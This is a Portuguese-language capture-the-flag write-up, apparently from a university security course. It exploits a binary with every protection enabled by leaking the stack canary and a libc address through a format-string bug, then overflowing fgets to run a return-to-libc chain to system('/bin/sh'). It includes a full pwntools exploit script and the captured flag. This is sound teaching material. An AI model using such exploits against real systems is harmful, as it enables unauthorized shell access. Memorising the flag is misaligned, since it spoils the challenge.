Primeiro, utilizamos ```checksec``` no ```program```:

![Screenshot 2023-06-29 at 11 33 53](https://github.com/marisaazevedo/Seguranca-e-Privacidade/assets/98234753/614d79d1-e3e2-4bdb-92da-ce0bd8b79c12)

Verificamos que todas as proteções estão ativas.

Como foi indicado neste desafio "Não te esqueças, não há nada totalmente seguro." Então começamos por ultrapassar o máximo de caracteres permitidos, neste caso o máximo era 20.

![Screenshot 2023-06-29 at 11 33 58](https://github.com/marisaazevedo/Seguranca-e-Privacidade/assets/98234753/79654a87-4984-4176-870d-bd12c9ddd43a)

Com isto verificamos que ```stack smashing detected```, indicando então que o ```program``` não verifica o número máximo de caracteres, esperando que o canary faça essa confirmação.

Após fazermos debugging ao ```program```, descobrimos algo que não é nada normal. A função ```fgets``` está a ler 100 caracteres, em vez dos supostos 20 caracteres. Então suspeitamos que existe alguma vulnerabildade em strings.

Confirmando a nossa suposição:

![Screenshot 2023-06-29 at 11 34 05](https://github.com/marisaazevedo/Seguranca-e-Privacidade/assets/98234753/8c0ead74-aa1b-462c-afa1-949c82f376cd)

Como conseguimos imprimir a informação da stack, confirmamos que as nossas suspeitas estavam corretas.

Acabamos por descobrir depois de alguma pesquisa que este ataque é chamado de ```Return-to-libc``` (https://en.wikipedia.org/wiki/Return-to-libc_attack). Então criamos um script para esse ataque:

```python
from pwn import *

LOCAL = False

# Offset de referência da biblioteca
reference_lib_offset = 0xf7daa519 - 0xf7d89000
# Offset da função system na biblioteca
system_lib_offset = 0x48150
# Offset da string "/bin/sh" na biblioteca
sh_lib_offset = 0x1bd0f5


def send_message(p, message):
    p.recvuntil(b">")
    p.sendline(b"e")
    p.recvuntil(b"Insert your name (max 20 chars): ")
    p.sendline(message)
    answer = p.recvline()
    p.recvuntil(b"Insert your message: ")
    p.sendline(b"")
    return answer

if LOCAL:
    pause()
else:
    p = remote("ctf-sp.dcc.fc.up.pt", 4002)

# Envia a primeira mensagem para obter o valor do canário e um valor de referência
first_message = send_message(p, b"%8$x-%11$x")

canary, reference_val = [int(val, 16) for val in first_message.split(b'-')]

# Calcula a base da biblioteca
lib_base = reference_val - reference_lib_offset
# Calcula os endereços da função system e da string "/bin/sh"
address_system = lib_base + system_lib_offset
address_sh = lib_base + sh_lib_offset

# Monta a segunda mensagem com os valores calculados
second_message = flat(b"A"*20, canary + 1, b"A"*8, address_system, b"A"*4, address_sh)

send_message(p, second_message)

send_message(p, b"A"*19)

p.interactive()
```

Após executarmos ```python3 script.py```, finalmente obtemos a flag: **flag{446742e444cf864d5d85fa643112492a}**

![Screenshot 2023-06-29 at 11 34 13](https://github.com/marisaazevedo/Seguranca-e-Privacidade/assets/98234753/b1f7d6d5-e2c2-49d4-8e33-33ab99576cb1)
